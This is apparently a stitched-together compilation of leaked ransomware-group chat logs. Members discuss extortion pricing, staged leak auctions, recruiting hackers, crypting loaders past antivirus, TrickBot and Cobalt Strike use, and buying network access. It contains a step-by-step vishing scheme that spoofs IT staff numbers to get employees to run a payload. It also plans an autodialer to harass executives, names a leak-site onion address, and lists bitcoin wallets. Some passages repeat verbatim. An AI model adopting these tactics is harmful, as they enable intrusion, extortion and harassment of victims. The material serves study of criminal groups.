why not attack the photo with the number and put the links from imgbb (the software for mass uploading of pictures as well as immediately getting the links to the embed is given)

imgbb - quite a trusted links as a dumping ground for images and "unique" attack is still an attack that filters can respond to + not every user has an attack loaded by default

[21:04:21] <johnyboy77> or you just score?
[21:10:55] <mango> hey bro
[21:11:06] <mango> Get specific)
[21:11:12] <johnyboy77> hello
[21:11:13] <mango> we work for money :)
[21:11:20] <mango> we don't give a fuck who we want it from
[21:11:22] <johnyboy77> I leaked correspondence of the people who work against russia
[21:11:25] <johnyboy77> in the information field
[21:11:31] <johnyboy77> but I can't decipher it
[21:11:34] <johnyboy77> signal correspondence
[21:11:52] <johnyboy77> shorter journalists
[21:11:54] <mango> let me ask)
[21:11:55] <johnyboy77> who bullshit against russia
[21:12:04] <johnyboy77> just the file is fucking broken I can't decipher it
[21:12:13] <johnyboy77> this is fucked up.
do we need this?
i don't know how to decrypt the signal
or we're just for the money and no political fuss
this is e2e
sorry there is nothing i can do here
I even want to
but I can't help it
so are we interested in such data?
i.e. are we patriots or what?))
of course we are patriots)
I got it. If they decipher it, I'll let you know
I also wrote to you the other day about aukion, but I figured you were busy and didn't get into it)
[21:21:02] <johnyboy77> in short, there's a mail from a person from bellingket
[21:21:06] <johnyboy77> who works specifically with ru and ua
[21:21:06] <johnyboy77> say so
[21:21:08] <johnyboy77> and all his passwords are there
[21:21:17] <johnyboy77> and it's still valid
[21:30:56] <mango> well, at least take a screenshot of his correspondence
[21:31:05] <mango> need more specifics bro what to talk about
[21:31:07] <johnyboy77> we'll upload the files

60k is a lot for a carbon black ?

my buddies offline are ready to buy, waiting for the go-ahead s..

since you're in a good mood and talkative today - here you go :-D
<mango> hello bully! I had a very cool idea about the data auction while I was sleeping. I propose to open a site that will be thrown into the public domain every say every 3 minutes 2-3 files of each non-paying company, randomly. And to take out the data of a particular company can only be done by paying for them. The cost is determined by the number of remaining files * let's say by 3 bucks per file. And then according to the auction system. Suppose there was a fuss about a company - sell to the highest bidder in the last 24-48 hours. I think so, they didn't pay ok. It's one thing to get the offices back up and running - it's another thing when there's an open daily leak of fresh personal and work data for a month What do you think about this?
hello here ?
:-$
I'm still working my way through the auctions.)
I'll show you what we're working on soon.
ok) the point is not just to roll out all the files at once, but a little bit at a time
that's my point)
Don't forget about Navalny, I told my boss he's waiting for details
give me a screenshot of what's in there and we'll figure something out
Pew pew.
I just told Nitrous that you'll be gone
No no))

As for the sonicwolves, the ones our rescuer sent me are RESTORED, used. that's why they cost 1k each. Sold only in US on ebay. I found new ones from the manufacturer in UK. Cost £2,500 each. With uC to lead three weeks in Sevastopol to this dude in the best case, because of the covid there are big problems with delivery. If you get new ones from England, it's faster. And you can get the new 410 there. They will be in Sevastopol in a week.

Hey, I'm working on it right now.
What about now?
Bro, I need some bits. For gps, for a router, for gaskets.
bc1q4qvnjchr3y9wpm78qlnr6659qrtnnt5pfgn6p5
62k.
55k salary, 2 and a bit for expenses and 4200 for the router (£2.5k router and 500 for shipping and hassle for my guys)
Tomorrow in the yuk will order in the morning, in 2-3 days will be in Fr, 3-4 days to ukr\blr and from there by conductor to Russia. If we can get it from Belarus, then from there we will send it by express mail.
?
We appreciate the further reduction in price. Please realize that even at 2.5 million, we don't just have that kind of money at the ready to pay you. It's still very high. I have discussed with my management team here and the truth of the matter is that we don't need the decryptor but we are very interested in paying something to not have our data released. We are still just trying to figure out how much we can scrape together to offer. While we are doing that, my boss wanted me to ask you whether or not we will get access to our data that you took once we paid anything? We have understandably done some research and we have seen that in some cases, the data is given back to people once a payment has been made. We also noticed in the file tree that you sent over that some of the file paths look like they were from your local system. We would also like assurances that our data has been deleted from local systems as well
So this account...
Server status is different.
Confused state and status. Sorry.
Okay, maybe we'll have something by tomorrow.

Bro this is all I could find on them. Give them a call, tell them if they still need a decryptor and have them chat it out. If they change their mind about paying, we'll start posting their files. If they will pay us for not having their files - we had technical difficulties, but now we have all their data and we are ready to show it if anything

Wow.
how many downloads do you have now?
Carbon all ready to buy
ok
for the carbon itself 14.8k euros. +20% of this amount for the conversion from the bit to the company in fr. and the guys as promised 30
Carbon sent me a pdf for my signature
with the price and all the conditions
drop it off?
tomorrow we will charge the bits - tomorrow they will probably pay already
sonicwolves already bought today, everything will be clear in a week
great
Let's send a pdf on carbon, but it's in French)

googletranslate it.
there's the general terms and conditions and so on.
I gave out all the paychecks today, 2 people were out all day, the rest got them all.
I don't need it.
Yeah, great.
Let's do it.
bc1qwjg3qcugy8n6778783a4rrxvn4nvx58yjg07dt
how much is this in dollars?
21k +30k, 30 can be done
14.8k euros + 20% commission 2800 euros approx.
I downloaded .

Pdfka sure you will not look?
It's just all the technical descriptions, etc., what if it is not what we need or what is missing?
I won't

the script from an untagged area of the disk gathers the load from different sectors into a single whole and executes it :)
cool
it should be used once in a while at least
i have a web panel so i can load a payload file, specify parameters (number of copies of hash, container name, lnk name, additional files in container) and i can assemble many different containers with hash different lnk to run it.
i did balzac and derek - they are pulling something, i spoke to derek today - he's making the splits, balzac is broken
Hey, how's it going?

I blame cryptors for using qaz.im, they upload files there and use this service to set passwords and make archive. Now all files are transferred to 2 archives under passwords and to mega - so far everything seems to be ok with the files...
Build machine for cryptors will be ready by the end of the month, yesterday they already started testing it but it is too crude yet

Prvieth, bro.
Making 2 echelles?
Hi
Go to .
Okay. I'm ordering everything.
Yesterday the second man hit 1494 bot. Good echel))
Well, why isn't he doing it?
Apparently not quite know how to send.
Although the man is also very experienced.
Either that or the trick doesn't work.
Balzac doesn't do well either.
Something they're doing wrong.
Maybe it's a letter.
Maybe.
?
Two of them are the same?
No, it's different.
Oh, man.
And yesterday, they did the same thing with the same Excel.)
Who's the other one for?
The first one's cherry@q3mcco35auwcstmt.onion. The second one's netwalker@q3mcco35auwcstmt.onion.
So, what about the payment?
Let's go 6k for two. For two weeks. Can we do that?
No problem.
Just like I wanted)))
(All right. ))
2 weeks at a time)
Yeah
How long before you lose the weight?
I'm guessing within the hour. Do it again.
Copy that. .
Sap's already got two skeletons ready.
Good.
Did you write Cherie that you made Netwalker and he fucked up?
Not yet.
I don't want him to look at himself and tell on us, like we're doing shit.)
I will.

I scanned the net for nasa - I'll send the file there as well \I didn't see any nasa

Sap's power is out, as soon as it's back on, he'll finish the second one and send it to me.
All right. I'll check the lag on the first one.
Okay. .

We have to test the performance of the build machine
yes i did
the result is not so good)
You need to check different loads every day.
All stubs. and report if something is not working to the head of the build machine
well, it's in the work to check)
I don't understand the crypto.
Will Stern still be there today ?
Stern all gone?

Glad to hear from you.
There's five or six exchanges on that one.

So the locker is fine.
We're polishing it for new challenges.
Which were not in the terms of reference, I'm sorry.
I can't shift the focus to new projects because of this.
According to the spec, absolutely everything has been implemented.
Even the AVs can't handle it. Checked it out.
Hi there.
How's it going?
You should ask Brown, he's a tester. I don't want to praise myself. And he saw everything in the battle... :-)
That's not even the main thing there. There we beat the AV thanks to an absolutely idiotic assembly of the project.
So idiotic that the ABs do not respond to it. In fact
Hi
All laid out, all described.
We need 30 progers for the booze
and 50 admins for reverse and horses
so how many do we give?
1?
hello
hello
where did you go?
Are you working at all?
Give him a 1.5.

when you answer my questions))))
I got 65k off.
You know what else you need?
50 admins.
25 for hors and 25 for revers@
hors@ revers@
holy shit)
and 30 more progers for the booze.
Yes he said ... will be done ...
he had the beats, went to give them away. answer the questions as you can, at least for the morse, what are the modules needed for it
he needs modules for the morsel.
ok
Hi, are we going to start?
You give me 3 -4 days off?
yes
Take it
Great, thanks.
Now I'm thinking of putting vntz in that wrap too.
Hello?
I don't need it.
I do.
Hey, how you doing?
))
Sorry to interrupt, but Sandy's not off the subject.
He really wants a new, even more effective release.
And I've got it!!!!!!!!!
It's a pain, of course, but you can't throw it in the trash, can you?
I mean VNC, not Sandi.
:-)
On second thought, though.
Nah, Sandi's good.
Let's move on to more pleasant matters.
Bonus!
A bonus?
Yes, a bonus!

i've been messing around with the logs, i told you about the stick theme many times , balzac was making bots i was pouring the stick and other stuff while the stick collector was drunk or passed out for weeks, then there was a long break, then the collector stopped pouring, now it's working again, but somewhere balzac is gone and you cut off all access
And if I can't work it off.
I can pour the stick and give you half of all the work

send me the report if you need it I'll pass it on)

hello bro! happy holidays!
Hey, Salamander is your dude? S has some questions about him there...
Hey, bro! Happy Holidays!
Hey, Salamander's your dude, right? S has some questions about him...
[14:32:06] <mango> bro, do it again please
[14:32:08] <mango> it's all cut up.
[14:32:21] <mango> drunk accidentally pulled out the flash drive, everything is ruined)))
1. Salamandre wrote everything off, waiting for reports from him.

2. I have contacted Veron - he has problems with the dock so far. I promised him to help during the holidays, either dock will do it, or the second option is a container. I have arranged him a presentation, all described how it works and what can, waiting to get acquainted. On the start will say during the holidays - waiting for how to solve the issue with the dock\delivery paiload.

3. you still haven't answered what config you need for installs. I remind you that we decided to give it a version of Trick2 (which was originally planned for Target) for Veron - what modules should be in config troy, and which can be removed, so as not to stain extra modules and reduce weight\detects in the eche. If I understand the software structure correctly - I need injector, pvgrub, importdll. What other modules are vital in the config?

4. Contacted Hors about the admins - he clarified the problem, says we need more pentesters, not admins. And at 6 am in my beautiful and drunken head came up with a great idea where to get them :) Remember Revils PR'd on Damag - a thousand bucks in bitcoins on the deposit and then they started tearing up the topic - they wrote there that they are inviting teams of hackers / pentester to work with them. They wrote five pages of their topic with suggestions! They wrote something like this. "Team 3 people experience, etc." and there are a lot of them 5 or more pages! That's where we take them! I spammed on them all personalities with an offer of work + many there are contacts themselves left (though toks all). By the 10 th will be done. The only question is about payment to them. How much do we pay? 2k - as all?

And zp me if you can)) bc1qclzlkq8j3ckmulye0k5xpzfymsxxha735mlauf
And here's more. I suggest for Veron always prepare 2 files for 2 groups at once. What if the file gets tired quickly (which is not uncommon for us + its volume) - we always have a ready crypted second file in order to avoid downtime and waiting for cryptors. I think it would be a good move, just remembering times when I myself poured - our main problem was to get the file by 10 am (and he is an early bird and does not tolerate delays) and the second point - the replacement of crypts - before it could last for 2 hours. And with this maneuver we have a good reassurance

[01:23:21] <buza> just quote me and give him statistics how many resumes you had and how many were rejected because of salary
[01:23:53] <buza> the problem is I have no idea how he can convincingly prove his worth
[01:24:20] <buza> if you make a complicated task, it will take him a long time to solve it
[01:24:28] <buza> and part of it will refuse at all
[01:24:39] <buza> that means he should show some of his past merits

he used to use this email andrej.sergeev_2020@mail.ru maugli765 but it got sent to spam
swift asks you to write to him

Trick. It's ok today.
Hi! Happy Holidays!!!
Let them offer their salaries.
who say no!
Besides that, we need some regular progessors...
and admins
regular progres, of which there are already a lot...
we need 30 more of them
Get the terms of reference from Booza
the trike only needs networkDll, pwgrab and propagation modules which will be loaded later and that's it
>pay? 2k - like everyone?

No, they will be on interest.
Veron is the most important person right now.
He gets all the attention.
Yeah, I get it. Okay.
And also...
The hackers are writing...

hi
how are you doing?
Hi
hi
there's mango writing about vpn.
hey bro!
happy holidays to you !
I don't know what Armata should write without you.
[Error: the message is encrypted and cannot be decrypted.]
hello
I need you right away.
Anyway, cancel your vacation.
Needed every day.
I'm having trouble getting data into the warehouse.
and you need to be in by 11:00 p.m. anyway.
because people start working actively when you're gone.
You can leave later, but it has to be before 11:00 or better.
He was out during the day. He's got hls for today. He's not answering yet.
Do you have bots?
Knock on the door.
I think he had our deposit on germany.
Remember?
Send it to
I see, thank you.)

Hi, please make a log of all errors if the client fails for some reason to create a chat when loading the .txt
Hi, ok

[22:16:21] <love> Okay, tomorrow then. After they took away the accesses now bots do not go to the admin, we still deal with it
deal with it
urgently
Hi
how are you ?
hello
Let's modify Trick and get rid of all the unnecessary stuff.
We don't really need the admin logpost and so on.
what do we need?
and a lot of unnecessary functionality
the main thing is clean and fast turnaround
and workability at all
what does logpost mean ?
any ideas maybe
logpost is an injectDll module
into browsers which
got it
but it doesn't seem to be loaded for a long time
well, I guess so.
maybe there's something else in there.
There's a support team here at love@.
Yeah, I know.
he says that the boots do not knock, and if they do, then it's hard to bring them to cobalt
None of them knock at all.
What do you mean the cobalt doesn't start with the trike?
 > And there's a grid that we did not start yes chat?

You have to check with Hors, I don't take reports from him. Only on the fact of payment
Let's pay for Spam and add it here and Armata too.
for armata, we need to test it
on 20-30 bots maybe
how it will bounce back in general
what do i throw at him now and what for?
what if there is no bounce
at all
I've heard that on the c-grade software it doesn't bounce at 20% only
I'd have to test it.
at least a couple of times.
Well, there's a pws
command
how do you run cobalt on trike?
and this command doesn't work from trike ?
z yt pyf.
I don't know.
love tells me.
Maybe he's a little slow.
hi
I'll check with him, he's probably screwed up somewhere.
He probably wants to quit on his own.
He has no results.
It's been two months now.
he recently wrote me about running an exe 42, 43 command
I gave him tasks to look for coders, reversers and admins
0 from him
from viper 20 people have already come
and they're working
the link needs to be encrypted, and he was translating it to base64
When are you online?
I can't catch you.
Hey, how you doing?
Told me it wasn't working.
Yeah, it is.
We're having a lot of trouble encrypting the links.
We should do the black one like the pink one.
The link is encrypted by the api.
Let's do it in the same place.
Who does the black admin?
It's a matter of one day.
Yeah, the api's already done.
koo
Hi.

[07:46:04] <hof> we have a lot of trouble with link crypto

Hi.

2. Where are the new coders? I need the crypto department, I will give a person who will train them through roketchat. I'll have to raise the rockchat and add 10 coders there. Does HR supply you with people? If not, why not? Did you contact them? I gave you the direction I need 100 coders this summer. You move this direction. You need to move all the other people.
3. Write down by each coder who does what, who are the supervisors, etc.

Look, it doesn't work like that.
Why don't you come out at least rarely?
<mango> On Alka, I found contacts through my relatives. I have a great contact with the Russian diaspora in Brooklyn, we have our own chief judge there) it's that here the chairman of the court - she immediately gave us her lawyer who moves with her. All the states there have their own laws and lawyers accordingly. This one specifically from Florida, he's a local there, he kind of knows everyone.  At 5 a.m. they blew him up) they gave him all the information he needed. Told them so: we need to clarify the situation with all the latest news, find out who her lawyer and what claims go to her, etc., in general, while intelligence, try to get all the official papers that there is and then we will think. She got a job online, she didn't know what she was doing and who she was working with. I'll keep you posted.

You make a crm, you put in a permanent corp with employee contacts, job title and first name and last name.
then you make scripts
you divide them into operator departments, for example, the first one for warming up, the second one for action, the third one for fixing.
Just an example: find out the name and phone number of their sysadmin. And the numbers of ordinary low-end IT people. Warmers call with a substitution of numbers from the IT-specialists and ask why they have not updated any software or Windows (examples are all), like procrastination is the risk of hacking and he's like the guilt will be later, like you're all skrynami skrynami and manuals. He says he did not get anything. The IT-specialist says that he will pass the information to the sysadmin and contact the client again. Before that you have to call him by name and position. The second department calls on behalf of the sysadmin and from his number, and says "no remote access," like they said to update earlier, they say, "install the update and give him a link to a payload file such as mega or rklouda, or something else, or a link just his or the mail saves. He puts it running, then either the scheme to the third step is played, like I'll send a technician to the department and he will do everything, and the technician calls and tells him when he comes to them, and the person waits for him calmly not panicking like something is running and so on.
[17:04:06] <Ali> Then they call him and the director tells him
[17:04:10] <Ali> Kind of like this
[17:04:17] <Ali> There are a lot of scenarios
[17:04:33] <Ali> But we should automate the process
[17:04:36] <Ali> There are robots
[17:04:49] <Ali> You set them up with scripts
[17:05:03] <Ali> And operators just answer robot calls
[17:05:10] <Ali> They mark the result
[17:05:27] <Ali> The robot itself dials up as there's a free operator
[17:05:41] <Ali> And then the contact itself sends to the desired stage or basket
[17:05:47] <Ali> Have you tried that?
[17:32:54] <Ali> I started to work this way, within a month already had results, unnecessary scripts and actions were sifted out, the necessary remained and finalized
[17:42:28] <Ali> Target worked exactly this way
Write me back when you're up and running.

[Error: Message encrypted and impossible to decrypt.]
The salary is in bits, of course.
I recommend using a mixer.
I understand bits, but what is a mixer?
it's what depersonalizes them

Did the recruiter tell you what we do?

Yeah.
look something up on the darknet.
go into more detail
so there won't be any misunderstandings later
If I choose Keshin through the exchanger like depositing cash to the card, is that okay?
Yes
ok
Then OK.
There are a lot of directions.
Have you heard anything about ransomware?
nope
cryptojackers ?
lockers
Oh, I get it. Yeah.

I got a letter in response to the job, I think somehow need to negotiate our actions, not to pay one person for the same task several times. about the bit cache I did not tell him:
I chose the first job I saw about obfuscation of strings.
Prepared the project in VisualStudio 2019 below.
If you need, I can send the archive with the solution .sln.

You can simply copy the text into a typical console ""hello world"" VS2019 project.
Compile and get what I have tested - the presence of lines in the program,
their absence in the binary (verified by hex editor), or in the timing of the handy
IDA PRO program.
If the assignment is done according to your assignment and your ideas
of the correct solution, then please list the promised fee to

bro
here

Bro urgently.
Hi. Are you there?
are the messages coming through?
Look, as a matter of fact, there is a theme that there are always targetets. stupidly buy up. people at a % not willingly give. sit brooters, styler owners, etc., and it is easier for them to get a fix for their access. targetets with rev 100k worth about 3k+$. etc. there depends on the grid of course. i suggest buying up anything and everything. My partner, an acquaintance of mine, does this. In one month he made 5k in payments. he found suppliers and buys everything. he spends a lot, but the output is not commensurate with what he spends. i suggest buying everything he can get his hands on. traff, accesses (sitrixes, vpn) ... We're moving on spam, hopefully we'll win. But we can't just sit on our asses.

In different calculations, or one? Should I give all of them the salary or chors and revers themselves to deal with their own?

On Alla need an answer, I understand that you're very busy bro, but I'm there a hell of a lot of people pulling on your requests and now they have a week to mess with the head on the result. They just will not help then, and they would be very useful to us)

hey keep everything in different reports
I am waiting for specifics from you
Hey bro
hi
hey
I'll be home in 5 minutes
 1. Alka is being transported from Florida to Ojai, she has a state lawyer as there is no money for her own I understand. We can get the documents if our lawyer will make an agreement with her to defend and represent her. In order for him to start acting, we need to charge him 10k. And we need to figure out how to get it to the US safely... I don't know how and what to do next, everything is hanging there. He's waiting for an answer.
So I finally got it right about the new people? 50 revers with Prof, 50 Horses and up to 100 coders by the end of the summer for the bouza ?
yes
That's right.
and we need 5-10 ali
ali@
admins too
We have hr managers salaman, kagas and viper
They are also involved in this issue.
In addition to your search
Keep them on your radar.
And the payroll
.
Yeah, I got it, viper wrote me. I'll do it.
I'll need 10 more reversers for swift@.
Keep an eye on them too.
And look for more options at the same time.
about ohaa
are you trying to raise an army or something :)
That's not what you're telling me.
10k for what?
what are you talking about?
conditions
And if she refuses it.
For the lawyer to start work and make an agreement with her.

[16:53:40] <balzak> anyway bots are coming)
[16:53:51] <balzak> there def something does not show up in the admin
are you there?
what's going on there?
without this agreement he can not do anything
it's not about the money.
it's just a yes, no no answer...
yes. okay.
do
carbon seems to have bought, half an hour ago he called, I'll tell you more in the evening).
http://epyclq65gskclmpu.onion:1337 is our file dump. it's gonna be on the sia blockchain.
super
But the booze didn't seem to appreciate it...
What did he say?
i told him what we discussed before about the fileswash, memos, and the ii in the blockchain. he was yammering on about no people or resources to do it, that it was all a dare and so on) i got it all done by one of our admins, benny in rocket. now we are testing and thinking about the functionality)

[16:57:25] <balzak> at the moment sending, according to the stat already 50 bots, sending about 40 minutes, but there's something in the admin red does not come, def parses
[16:57:39] <balzak> here's all info
there?
take all tricks and all problems
ideally, it would be the same as on qaz.im but without logs, plus access to files and service by personal password
i'll pay more, but i want you to be in charge of everything and keep in touch with everyone inside the jabber
to make sure everything clicks.
if you need to redo the admins
because the song continues with the fact that cryptors and testers leak files to all sorts of shitty services...
Are the paydays on pdn or friday?

There are no new bots there now.
And the topic's dead
hello
I need a stick just - online and that's all, and your topic is dead or I do not understand?
 Balzac would make bots.
Yeah, great.
hi
i wanted to get into the live stuff, on what terms do i have this opportunity?
hey
If you can get the bots.
then go for it.
Yeah, Balzac can't do it right now either.
if it works out
you take his bots
share it amongst yourselves
I don't need anything
zero possibilities in this matter, I spent a couple of months studying - no use
i'm there for the bots in general and just to gather information
i.e. as for killing some account no
I only collect information on the company
by hitting the accounts.
I mean, there's no harm in it.
it's not amazon
Or any other stores.
found the right link - went in, gathered information - came out, and never came back
for offline work
i can drop some money right away if it's a question of finances
I tried to look in the publick - there is just ZERO bu-bots. so I will not catch fish there.
?
Look, I'm trying to figure it out, there's a table on the blacklist. But on the white list, I can't figure out where to put the ip.

Greetings. Created cryptor subprojects in redmin. Still have a problem with permissions.
If I create a subproject without inheriting rights, only I am there and only as a developer.
If I create a project with rights inheritance then my rights are inherited and others, but it is not possible to remove extra developers, because they are inherited.

For the connection.
Goes to 4022 inside
You need a 4022
external
So it'll be empty.
Why? Internal any, external 4022.
That's not how it works.
The login ip is a big server with internal virtualization
I'll open up a port on it-- 4022.
But it won't have any rules to communicate with the virtualization
The ingress IP is a big server with internal virtualization.
I'll open up a port on it. 4022.
But it will not be prescribed rules for interaction with the virtualization

Do you have a chance to run a lawyer through the US?
See if there's any possibilities there. I need some backup on the Alka...
e vtyz ytne
I don't have one.
Hey. .
fuckin' .
look at the thing about alka... she is not an immigrant, she has all her relatives there, citizenship, etc. she has 50 cases - episodes according to ours. she is a Russian hacker, the case will be political, most likely
They gave me a lawyer, they said the best one, plus great connections, he knows the investigator, he knows the judge, he is a federal lawyer, licensed and so on. he got acquainted with the case, he says it is hard, but you can come up with something, to start with you should get the minimum and then try to get out sooner, you will not be able to go to jail
She's looking at 30 years to life.
Holy shit
Well, we have to help her.
And also...
the case will last a year or two at best. he says the whole process will cost 150,200,000, you can do it in two installments.
We have to get the whole case.
I can give you all his info.
It's expensive, there's no point in trying.
He can only get the case if he's handling it
We need to find a lawyer who's sane.
The second thing is we need someone to make the agreement at all.
And if it's a good idea, it's relatives.
What do you mean, a sane one? Pay him a month?
Here they do everything in white, the contract from their law firm and so on and so forth. and this is for the entire process, it will not be less in any case
I can give you his details. You go on there, or check him out. That's all I can do.
You have to take it one step at a time.
You have to get the whole case first.
That's only if he's her lawyer.
No one will give him anything like that.
That's not the only way.
We'll have to go through someone else.
It's a tough case, when they started to find out, they said that the FBI has a very close control of the case, they've been looking for a week for someone to sign off on it.
let's go this way. try it yourself through someone else. try to get a lawyer that I will give, and you have to at least within a month to make a decision
I will try to talk to pay in installments, but they assure me that everything is in good faith according to the contract, they have a license and everything...
I'm waiting for an answer then, I've got them on my trail
i got a couple of people for hors, a couple more admins... i'm trying to fight with cryptors, but so far we're having a hard time with vatakat, i don't understand detection...
what other tasks are there if you write.
i have a feeling that i am a bit short on payroll - i gave it all away, i managed to fix it before the bitcoin fails, i still have about 1k left and i'll take it tomorrow
https://ibb.co/jVpZngt

There's a picture there of the lawyer's contacts. He was also given by serious guys, and I'm sure of him, because I know people who recommended him. If you find a better one, I'm all for it. But that's all I can do for now.
Here's another thing before I forget, there's someone who gives you access - he wrote that he had problems with the bot with it, asking if we can rent the software and on what terms?

I do not know anything I can not say for him, I talked to him a little bit about the locker, he knows avamar as I understand it and he also wants to work on the locker
I think let's try to work with him, but he's waiting for the linux version.
I have one os left to check there.

And that's basically it.
Avamar is a normal guy, he works - he gets paid, maybe tramp too
hello, put it on work please, can also 5k

Checked with avamar for him
I do not have any complaints about him, he has been working in different areas for a long time. But you know the rule when working online - trust but verify!) But it is everywhere)

yeah, you said you're good at asterisk
we need to make an autodial
on targets from different numbers what do we need to buy for that?
hello
Yes, I have experience of work and settings.
Auto-targeting by directory.
yes
we will deliver directories simply numbers there
You need a virtual server to install asterisk, the phone number from which the call will be made
Phone numbers will change
As far as I understand it is necessary to buy sips
I do not know asterisk
what will be the city numbers to be switched
depending on how many numbers will be switched
change the numbers
and the numbers should be american or something
or European
ideally buy them for a bit
Well, if anything, they'll just be pasted
from the left plastic
how often will the outgoing numbers change
oh, I don't know.
We'll think about that.
Then here's what you need to understand.
how often the outgoing numbers will change.
I will find out how to buy European or American numbers
need a virtual cloud resource where Asterix will be located, if there is no such resource, I can also analyze this market
the purpose of the caller ID? to understand if the number is alive or not?
no part of the call to demand a ransom and fuck the top managers with it
sometimes they don't say anything.
I get it. It's just an automatic call.
They need to be reassured.
is there a resource for setting up a phone server, a virtual server?
Of course I do.
I'll give you a server.
All right, then I'll gather information on the phone numbers for cost and purchase
for the bit.
Yeah great
Well, then it should be understood that the numbers will be blacklisted, I will think about how to track it so that the numbers are not used in spam in the future
Yeah, okay.
How often autodialing will happen every day or another algorithm
how many calls the top managers should autodial
for example
2 calls a day from different numbers and so on during the week.
well, or another algorithm
Hello
Yes, it's coming.
More likely to be ready by the end.

Okay, I'll think about it.
Ok, I'll look for information on how to purchase numbers and their cost

hello here?
*** unverified correspondence resumed
*** 2021-06-02
[00:27:29] <mango> got a guy in our rocket - will form the department of analysis and blackmail :)
[00:27:44] <mango> we should think of a method to search data on targets, where and so on
[00:28:04] <mango> if you have any developments - share brotherly
[00:28:09] <mango> for the common good :)
[00:33:59] <hors> Not much experience, but I can tell you that you need a hard policy and limit the time, otherwise they already start to think up a fucking thing, 3 cases so merged
[00:38:19] <mango> no no
[00:38:31] <mango> it's about finding contacts and collecting information
[00:38:36] <mango> search through social networks and so on
[00:38:44] <mango> here's how to analyze
[00:38:47] <mango> I look what I think
[00:39:29] <mango> we should as soon as the case came into work - immediately to gather information as soon as lock - we already had established the right contacts, phone numbers, their partners, and options how to push on them
[00:39:30] <hors> there's all the info in ad_users, there's all the employees and their mail, names, etc.
[00:39:33] <hors> and positions
[00:39:45] <mango> that's how
[00:39:58] <mango> if you pick up date - provide us these contacts at least for study
[00:40:27] <hors> Sure
[00:40:31] <hors> We'll give out everything at once
[00:40:33] <mango> anything you take from network - anything that will help us to analyze it would be cool of course
[00:40:40] <mango> somehow everybody should coordinate
[00:40:45] <mango> so it wouldn't all come down to us)
[00:41:17] <hors> will you add me to the rocket?
[00:41:19] <mango> you need to tinker with tin. you got the timing right
[00:41:23] <mango> yeah we'll do it tomorrow
[00:41:39] <hors> kk
[00:41:44] <mango> deadlines is one thing, they should be afraid of leakage
[00:41:49] <mango> we have to study leaks in details
[00:42:03] <mango> and see what's useful there, recent developments, etc. everything that could cost them money
[00:42:05] <hors> yes, study in detail the information we take from them
[00:42:10] <mango> not just pour it on mega
[00:42:21] <mango> it takes a fuckload of people
[00:42:22] <mango> )
[00:43:04] <mango> clever thoughts written down, I'm going to sleep\to digest)
[00:43:06] <mango> good night, bro
[00:43:16] <hors> good night)
With Horse also mussed the topic of redemption, I understand that pay all very reluctantly, it is necessary to press harder... On the timing of limiting dunno sure how, 2 weeks is quite acceptable, because many take loans, etc.. I think that it is necessary to analyze the deeper and creep it that we leak that is expensive for them, but not everything, plus we must be harder to pressure, annoying phone calls, annoying partners, cover in the media... I propose to organize the work so that by the time the local have a full report on the analysis: top management, contacts, their personal data, what we find partners, their contacts, and most importantly calculated strategy, how to pressure that for which targets is acceptable. We are tits up, bargaining like schoolboys, gangsters do not behave that way, all these concessions are useless, I did not even expect it from you :-D We just have to be realistic at first to put the price and stand firm on its own. And we start with a lakh and agree to 100k. Given the fact that the FBI is monitoring all these negotiations, I think they are making fun of us. There's a reason they're pulling all these negotiations, studying us, our wallets, etc... And if they are so damn relaxed and do not want to pay - let's have some kind of violent protest. Maybe a big plum what a loud, or even something that will attract attention, maybe even make lokov and plums without any redemption - a show flogging type) Discount there companies 30-50-100 - throw out all the data, who can break ... you can not even the big, but so that everyone was on the ear, so that others have strained and thought less ... And change the color of admins, we're locker, not tiffany :-D

Maybe a big plum what a loud, or even something that will attract attention, maybe even make lokov and plums without any redemption - a show flogging type) Discount there companies 30-50-100 - throw out all the data, who can break ... you can not even the big, but so that everyone was on the ear, so that others have strained and thought less ...

[00:27:29] <mango> got a guy in our rocket - will form analytics and blackmail department :)
[00:27:44] <mango> we should think of a method to search data on targets, where and so on
[00:28:04] <mango> if you have any developments - share brotherly
[00:28:09] <mango> for the common good :)
[00:33:59] <hors> Not much experience, but I can tell you that you need a hard policy and limit the time, otherwise they already start to think up a fucking thing, 3 cases so merged
[00:38:19] <mango> no no
[00:38:31] <mango> it's about finding contacts and collecting information
[00:38:36] <mango> search through social networks and so on
[00:38:44] <mango> here's how to analyze
[00:38:47] <mango> I look what I think
[00:39:29] <mango> we should as soon as the case came into work - immediately to gather information as soon as lock - we already had established the right contacts, phone numbers, their partners, and options how to push on them
[00:39:30] <hors> there's all the info in ad_users, there's all the employees and their mail, names, etc.
[00:39:33] <hors> and positions
[00:39:45] <mango> that's how
[00:39:58] <mango> if you pick up date - provide us these contacts at least for study
[00:40:27] <hors> Sure
[00:40:31] <hors> We'll give out everything at once
[00:40:33] <mango> anything you take from network - anything that will help us to analyze it would be cool of course
[00:40:40] <mango> somehow everybody should coordinate
[00:40:45] <mango> so it wouldn't all come down to us)
[00:41:17] <hors> will you add me to the rocket?
[00:41:19] <mango> you need to tinker with tin. you got the timing right
[00:41:23] <mango> yeah we'll do it tomorrow
[00:41:39] <hors> kk
[00:41:44] <mango> deadlines is one thing, they should be afraid of leakage
[00:41:49] <mango> we have to study leaks in details
[00:42:03] <mango> and see what's useful there, recent developments, etc. everything that could cost them money
[00:42:05] <hors> yes, study in detail the information we take from them
[00:42:10] <mango> not just pour it on mega
[00:42:21] <mango> it takes a fuckload of people
[00:42:22] <mango> )
[00:43:04] <mango> clever thoughts written down, I'm going to sleep\to digest)
[00:43:06] <mango> good night, bro
[00:43:16] <hors> good night)

Wants to pay his own way.

Probably.
He's got a trick.
He's waiting for a certificate to sign.
Well, let's do the cherry for now, we'll deal with that later.

If possible, with a built in load
With built-in on Monday we will do, I have not shown anything yet how to do

Cherry there's been making a fuss about no one's echelle not working.
He was having a bad time at the time.
You got someone sending with our bk?
Not at the moment.
Have you ever sent?
Balzac?
I don't have a team of five.
Balzac did, he didn't.
Yeah. .
It didn't go either?
No
Did he have any dots?
I don't know why.
Or spam?
No
Spam
Weird
Let's try him with a built in load then.
Ok
Fuck, I accidentally deleted someone from the team and I don't know who))))
Bummer
When does he want to send?
If sap catches up fast.
Maybe we can do an embed today.
I'm just busy right now, so I can't build it myself.
Not till Monday.
Okay.
I'll show him how to do it anyway, so it'll be ready.
If he always has to have a built-in, there'll be room for a second one.
All right, we'll try it.

and today we will be with Twin to infect 4k computers , tricks , because the government does not pay , we will take out the information and instead of locker we will upload to all machines in the network trickbot so that stafers can profit
About xerox , Ali says it is complicated , but the prospects are good
Tween refused to pay 6 cops who were already willing to pay
